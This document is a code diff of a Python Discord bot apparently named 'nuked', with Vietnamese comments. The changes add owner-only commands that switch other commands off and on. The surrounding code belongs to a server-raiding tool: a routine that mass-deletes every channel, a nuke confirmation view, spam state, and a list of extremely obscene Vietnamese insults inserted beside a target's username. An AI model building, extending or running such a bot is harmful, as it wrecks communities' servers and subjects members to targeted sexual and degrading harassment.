@@ -8,21 +8,21 @@ import aiohttp
 from datetime import timedelta, datetime
 import json
 from keep_alive import keep_alive
+
 # ==================== CẤU HÌNH HỆ THỐNG ====================
 DISCORD_TOKEN = os.getenv("TOKEN")
 
 # Danh sách ID của Boss Bảo và các đồng minh ủy quyền
 BOT_OWNERS = [
-    1540585511842881616,1542453882263707759,1502969774202814625, 
+    1540585511842881616,1542453882263707759,1502969774202814625,
 ]
 
 intents = discord.Intents.default()
 intents.message_content = True
 intents.members = True
 intents.guilds = True
-intents.bans = True  # Sửa lỗi: intents.moderation không tồn tại
+intents.bans = True
 
-# Prefix dạng gọi tên bot "nuked <lệnh>"
 def get_prefix(bot, message):
     prefix = "nuked "
     if message.content.lower().startswith(prefix):
@@ -31,16 +31,14 @@ def get_prefix(bot, message):
 
 bot = commands.Bot(command_prefix=get_prefix, intents=intents, help_command=None)
 
-# Biến trạng thái cho spam
 spam_task_running = None
 
-# Lưu cấu hình cho từng server
-SERVER_LOG_CHANNELS = {}       # {guild_id: channel_id}
-WELCOME_CHANNELS = {}          # {guild_id: channel_id}
-GOODBYE_CHANNELS = {}          # {guild_id: channel_id}
-SERVER_LEVEL_CHANNELS = {}     # {guild_id: channel_id}
+SERVER_LOG_CHANNELS = {}
+WELCOME_CHANNELS = {}
+GOODBYE_CHANNELS = {}
+SERVER_LEVEL_CHANNELS = {}
+DISABLED_COMMANDS = set()  # Danh sách lệnh bị tắt
 
-# Hệ thống Level lưu trữ trong file
 LEVEL_FILE = "levels.json"
 CONFIG_FILE = "config.json"
 
@@ -57,7 +55,7 @@ def save_levels():
         json.dump(USER_LEVELS, f, indent=2, ensure_ascii=False)
 
 def load_config():
-    global SERVER_LOG_CHANNELS, WELCOME_CHANNELS, GOODBYE_CHANNELS, SERVER_LEVEL_CHANNELS, BOT_OWNERS
+    global SERVER_LOG_CHANNELS, WELCOME_CHANNELS, GOODBYE_CHANNELS, SERVER_LEVEL_CHANNELS, BOT_OWNERS, DISABLED_COMMANDS
     try:
         with open(CONFIG_FILE, "r", encoding="utf-8") as f:
             data = json.load(f)
@@ -66,6 +64,7 @@ def load_config():
         GOODBYE_CHANNELS = data.get("goodbye_channels", {})
         SERVER_LEVEL_CHANNELS = data.get("level_channels", {})
         BOT_OWNERS = data.get("owners", BOT_OWNERS)
+        DISABLED_COMMANDS = set(data.get("disabled_commands", []))
     except (FileNotFoundError, json.JSONDecodeError):
         pass
 
@@ -75,7 +74,8 @@ def save_config():
         "welcome_channels": WELCOME_CHANNELS,
         "goodbye_channels": GOODBYE_CHANNELS,
         "level_channels": SERVER_LEVEL_CHANNELS,
-        "owners": BOT_OWNERS
+        "owners": BOT_OWNERS,
+        "disabled_commands": list(DISABLED_COMMANDS)
     }
     with open(CONFIG_FILE, "w", encoding="utf-8") as f:
         json.dump(data, f, indent=2, ensure_ascii=False)
@@ -88,11 +88,9 @@ CUSTOM_SETUP_GIF = "https://i.pinimg.com/originals/7a/41/bb/7a41bb51fe3babe0c6ce
 NUKE_GIF_URL = "https://media.discordapp.net/attachments/1541456087105151066/1542122209156538388/739ed3f3955356f06352d43eb649168a.gif?ex=6a9014b9&is=6a8ec339&hm=3ec421cedab61dea731230ee0ee1327c900406c15b333adbdd4003452727f06e&="
 NUKE_AVATAR_URL = "https://media.discordapp.net/attachments/1541456087105151066/1542127023810416660/8b59ed006d0073e951a47e1da3c2d111.jpg?ex=6a901935&is=6a8ec7b5&hm=2905f55bd53b4142f359b31f020f6a474c89878b9b2a28dffdb5f047040f4381&=&format=webp"
 
-# ==================== CÔNG THỨC HÀM LẤY EXP CẦN THIẾT ====================
 def get_required_exp(level: int) -> int:
     return level * 100
 
-# ==================== KHO SPAM (209 CÂU) – GIỮ NGUYÊN ====================
 ROAST_LINES = [
     "# Lồn mẹ mày nát bét như tương, bị địt đến không còn + chảy lênh! {username}",
     "# Đéo biết xấu hổ, lồn mẹ mày thối như cứt + xác chết đầy dòi bọ! {username}",
@@ -237,7 +235,7 @@ def is_bot_owner():
         return ctx.author.id in BOT_OWNERS
     return commands.check(predicate)
 
-# ==================== VIEW XÁC NHẬN NUKE QUA DM ====================
+# ==================== VIEW XÁC NHẬN NUKE ====================
 class NukeConfirmView(discord.ui.View):
     def __init__(self, guild: discord.Guild, channel: discord.abc.Messageable):
         super().__init__(timeout=60)
@@ -923,13 +921,11 @@ async def delete_all_channels(ctx):
             tasks = [ch.delete() for ch in batch]
             await asyncio.gather(*tasks, return_exceptions=True)
             await asyncio.sleep(0.5)
-        # Không gửi tin nhắn hoàn tất vào kênh đã bị xóa, thay bằng gửi vào log nếu có
         complete_embed = discord.Embed(
             title="✅ 🌈 **XÓA KÊNH HOÀN TẤT** 🌈",
             description="🎉 **Đã xóa thành công tất cả kênh!**",
             color=0x00FF00
         )
-        # Gửi vào kênh log hoặc DM owner (nếu có)
         if ctx.guild.id in SERVER_LOG_CHANNELS:
             log_ch = bot.get_channel(SERVER_LOG_CHANNELS[ctx.guild.id])
             if log_ch:
@@ -1401,7 +1397,8 @@ async def admin_commands(ctx):
         "`nuked serverinfo` - Thông tin server",
         "`nuked userinfo @user` - Thông tin user",
         "`nuked avatar @user` - Lấy avatar",
-        "`nuked shutdown` - Tắt bot"
+        "`nuked off [lệnh]` - Tắt lệnh hoặc bot",
+        "`nuked on [lệnh]` - Bật lệnh hoặc thông báo bot đang hoạt động"
     ]
     embed = discord.Embed(
         title="👑 DANH SÁCH LỆNH QUẢN TRỊ",
@@ -1416,6 +1413,63 @@ async def admin_commands(ctx):
         embed.add_field(name=field_name, value=field_value, inline=False)
     embed.set_footer(text="Độc quyền phục vụ Boss Bảo 💖")
     await ctx.send(embed=embed)
+
+# ==================== LỆNH OFF & ON ====================
+@bot.command(name="off")
+@is_bot_owner()
+async def off_command(ctx, *, command_name: str = None):
+    if command_name is None:
+        await ctx.send("🛑 Boss Bảo đã yêu cầu tắt bot. Tạm biệt!")
+        await bot.close()
+        return
+    cmd = bot.get_command(command_name.lower())
+    if cmd is None:
+        await ctx.send(f"❌ Không tìm thấy lệnh `{command_name}`!")
+        return
+    if cmd.name in ["off", "on"]:
+        await ctx.send("❌ Không thể tắt lệnh `off` hoặc `on`!")
+        return
+    if cmd.name in DISABLED_COMMANDS:
+        await ctx.send(f"❌ Lệnh `{cmd.name}` đã bị tắt rồi!")
+        return
+    DISABLED_COMMANDS.add(cmd.name)
+    save_config()
+    await ctx.send(f"✅ Đã tắt lệnh `{cmd.name}`! Gõ `nuked on {cmd.name}` để bật lại.")
+
+@off_command.error
+async def off_error(ctx, error):
+    if isinstance(error, commands.CheckFailure):
+        await ctx.send('❌ NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+
+@bot.command(name="on")
+@is_bot_owner()
+async def on_command(ctx, *, command_name: str = None):
+    if command_name is None:
+        await ctx.send("🤖 Bot đang hoạt động bình thường!")
+        return
+    cmd = bot.get_command(command_name.lower())
+    if cmd is None:
+        await ctx.send(f"❌ Không tìm thấy lệnh `{command_name}`!")
+        return
+    if cmd.name not in DISABLED_COMMANDS:
+        await ctx.send(f"❌ Lệnh `{cmd.name}` không bị tắt!")
+        return
+    DISABLED_COMMANDS.remove(cmd.name)
+    save_config()
+    await ctx.send(f"✅ Đã bật lại lệnh `{cmd.name}`!")
+
+@on_command.error
+async def on_error(ctx, error):
+    if isinstance(error, commands.CheckFailure):
+        await ctx.send('❌ NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+
+# ==================== GLOBAL CHECK: KIỂM TRA LỆNH BỊ TẮT ====================
+@bot.check
+async def globally_disabled_check(ctx):
+    if ctx.command and ctx.command.name in DISABLED_COMMANDS:
+        await ctx.send(f"❌ Lệnh `{ctx.command.name}` đã bị tắt bởi Boss Bảo. Gõ `nuked on {ctx.command.name}` để bật lại.")
+        return False
+    return True
 
 # ==================== LỆNH BACKUP ====================
 @bot.command(name="backup")
@@ -2200,17 +2254,17 @@ async def avatar(ctx, member: discord.Member = None):
 async def avatar_error(ctx, error):
     await ctx.send(f"❌ Lỗi: {str(error)}")
 
-# ==================== LỆNH SHUTDOWN ====================
-@bot.command(name="shutdown")
-@is_bot_owner()
-async def shutdown_bot(ctx):
-    await ctx.send("🛑 **Boss Bảo đã yêu cầu tắt bot. Tạm biệt!**")
-    await bot.close()
+# ==================== LỆNH SHUTDOWN (ĐÃ ĐƯỢC THAY THẾ BẰNG OFF) ====================
+# @bot.command(name="shutdown")
+# @is_bot_owner()
+# async def shutdown_bot(ctx):
+#     await ctx.send("🛑 **Boss Bảo đã yêu cầu tắt bot. Tạm biệt!**")
+#     await bot.close()
 
-@shutdown_bot.error
-async def shutdown_bot_error(ctx, error):
-    if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+# @shutdown_bot.error
+# async def shutdown_bot_error(ctx, error):
+#     if isinstance(error, commands.CheckFailure):
+#         await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
 
 # ==================== LỆNH ADDOWNER & DELETEOWNER ====================
 @bot.command(name="addowner")
@@ -2547,7 +2601,7 @@ async def clear_user_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
         await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
 
-# ==================== LỆNH GUITHU (DÀNH CHO MỌI NGƯỜI) ====================
+# ==================== LỆNH GUITHU ====================
 @bot.command(name="guithu")
 async def guithu(ctx, member: discord.Member, *, noidung: str = None):
     if noidung is None:
@@ -2574,7 +2628,7 @@ async def guithu(ctx, member: discord.Member, *, noidung: str = None):
 async def guithu_error(ctx, error):
     await ctx.send(f"❌ Lỗi: {str(error)}")
 
-# ==================== CÁC LỆNH TÌNH YÊU ====================
+# ==================== LỆNH TÌNH YÊU ====================
 # Danh sách GIF cho các hành động (mỗi danh sách 50 ảnh tenor hoạt động)
 GIF_HUG = [
     "https://media.tenor.com/2k4z1C2d5zIAAAAM/anime-hug.gif",
@@ -2897,14 +2951,12 @@ GIF_LOVE = [
 # Lệnh love: tính phần trăm tình yêu giữa hai người
 @bot.command(name="love", aliases=["tinhyeu"])
 async def love(ctx, user1: discord.Member = None, user2: discord.Member = None):
-    """Tính phần trăm tình yêu giữa hai người. Nếu chỉ tag 1 người, người còn lại là chính bạn."""
     if user1 is None:
         await ctx.send("📌 Cú pháp: `nuked love @user1 @user2` hoặc `nuked love @user`")
         return
     if user2 is None:
         user2 = ctx.author
-        user1, user2 = user2, user1  # đảm bảo user1 là bạn, user2 là người được tag
-
+        user1, user2 = user2, user1
     percent = random.randint(0, 100)
     if percent < 30:
         result = "💔 Có vẻ không hợp nhau lắm..."
@@ -2914,7 +2966,6 @@ async def love(ctx, user1: discord.Member = None, user2: discord.Member = None):
         result = "❤️ Khá hợp nhau đấy!"
     else:
         result = "💖 Trời sinh một cặp!"
-
     embed = discord.Embed(
         title="💘 TỶ LỆ TÌNH YÊU",
         description=f"{user1.mention} và {user2.mention}\n\n**{percent}%** {result}",
@@ -3012,7 +3063,6 @@ marriages = load_marriages()
 
 @bot.command(name="marry", aliases=["cuoi"])
 async def marry(ctx, member: discord.Member = None):
-    """Kết hôn với người được tag. Nếu cả hai đã kết hôn với người khác sẽ báo lỗi."""
     if member is None:
         await ctx.send("📌 Cú pháp: `nuked marry @user`")
         return
@@ -3040,7 +3090,6 @@ async def marry(ctx, member: discord.Member = None):
 
 @bot.command(name="divorce", aliases=["lyhon"])
 async def divorce(ctx, member: discord.Member = None):
-    """Ly hôn với người đã kết hôn."""
     if member is None:
         await ctx.send("📌 Cú pháp: `nuked divorce @user`")
         return
@@ -3103,6 +3152,7 @@ async def crush(ctx, member: discord.Member = None):
     )
     embed.set_image(url=random.choice(GIF_LOVE))
     await ctx.send(embed=embed)
+
 # ==================== DỮ LIỆU DANH MỤC LỆNH ====================
 HELP_CATEGORIES = {
     "🛡️ Quản lý Mod": [
@@ -3174,7 +3224,7 @@ HELP_CATEGORIES = {
         "`nuked icon [url]` - Đổi icon server (alias)",
         "`nuked backup` - Backup server",
         "`nuked restore` - Khôi phục server",
-        "`nuked shutdown` - Tắt bot",
+        "`nuked off` - Tắt bot",
     ],
     "👑 Quản lý Owner": [
         "`nuked addowner @user` - Thêm Owner",
@@ -3208,6 +3258,10 @@ HELP_CATEGORIES = {
         "`nuked ship @user1 @user2` - Ghép đôi",
         "`nuked crush @user` - Tỏ tình",
     ],
+    "🚦 Bật/Tắt lệnh": [
+        "`nuked off <lệnh>` - Tắt một lệnh",
+        "`nuked on <lệnh>` - Bật lại lệnh đã tắt",
+    ],
 }
 
 HELP_CATEGORY_DESCRIPTIONS = {
@@ -3223,13 +3277,13 @@ HELP_CATEGORY_DESCRIPTIONS = {
     "🔊 Voice & Emoji": "Quản lý voice, di chuyển, emoji...",
     "✉️ Tiện ích": "Gửi thư, đổi nickname, xóa tin nhắn...",
     "💘 Tình yêu": "Các lệnh tình yêu, cặp đôi, tương tác vui vẻ...",
+    "🚦 Bật/Tắt lệnh": "Quản lý bật/tắt các lệnh của bot (chỉ Owner).",
 }
 
 # ==================== CLASS VIEW TƯƠNG TÁC ====================
 class HelpView(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
-        # Tạo nút cho mỗi danh mục
         for category_name in HELP_CATEGORIES.keys():
             button = discord.ui.Button(
                 label=category_name,
@@ -3261,7 +3315,6 @@ async def setup(ctx):
         description="Chọn một danh mục bên dưới để xem các lệnh tương ứng.",
         color=0xFF69B4
     )
-    # Thêm các danh mục và công dụng vào embed
     for category_name, desc in HELP_CATEGORY_DESCRIPTIONS.items():
         embed.add_field(name=category_name, value=desc, inline=False)
     embed.set_image(url=CUSTOM_SETUP_GIF)
@@ -3277,15 +3330,11 @@ async def setup_error(ctx, error):
 # ==================== LỆNH HELP (CÔNG KHAI) ====================
 @bot.command(name="help")
 async def help_command(ctx):
-    """
-    Lệnh này ai cũng có thể sử dụng, không yêu cầu quyền Owner.
-    """
     embed = discord.Embed(
         title="📖 CẨM NANG ĐIỀU HÀNH",
         description="Chọn một danh mục bên dưới để xem các lệnh.",
         color=0xFF69B4
     )
-    # Thêm thông tin danh mục và công dụng vào embed
     for category_name, desc in HELP_CATEGORY_DESCRIPTIONS.items():
         embed.add_field(name=category_name, value=desc, inline=False)
     embed.set_image(url=CUSTOM_SETUP_GIF)
@@ -3298,6 +3347,7 @@ async def help_command(ctx):
 async def on_message(message):
     if message.author.bot:
         return
+
     guild_id = message.guild.id if message.guild else None
     if guild_id:
         if guild_id not in USER_LEVELS:
@@ -3336,20 +3386,17 @@ async def on_message(message):
 
     await bot.process_commands(message)
 
-    # Kiểm tra nếu tin nhắn chứa "nuked" nhưng không phải lệnh hợp lệ
-    if message.content.lower().startswith("nuked") and not message.content.lower().startswith("nuked "):
-        # Nếu không có khoảng trắng sau "nuked", có thể là nhập sai
-        await message.reply("ơi gì vậy sài lệnh thì cứ nuked + lệnh nha")
-    elif message.content.lower().startswith("nuked "):
-        # Kiểm tra xem có phải lệnh hợp lệ không
-        ctx = await bot.get_context(message)
-        if ctx.command is None:
+    # Phản hồi khi gõ "nuked" không hợp lệ
+    if message.content.lower().startswith("nuked"):
+        content_without_prefix = message.content[len("nuked "):].strip() if len(message.content) > 5 else ""
+        if content_without_prefix == "":
             await message.reply("ơi gì vậy sài lệnh thì cứ nuked + lệnh nha")
         else:
-            # Đã xử lý ở process_commands
-            pass
+            ctx = await bot.get_context(message)
+            if ctx.command is None:
+                await message.reply("ơi gì vậy sài lệnh thì cứ nuked + lệnh nha")
 
-    # Xử lý tag/chữ "bảo" như trước
+    # Xử lý tag/chữ "bảo"
     has_owner_mention = False
     if message.mentions:
         for user in message.mentions:
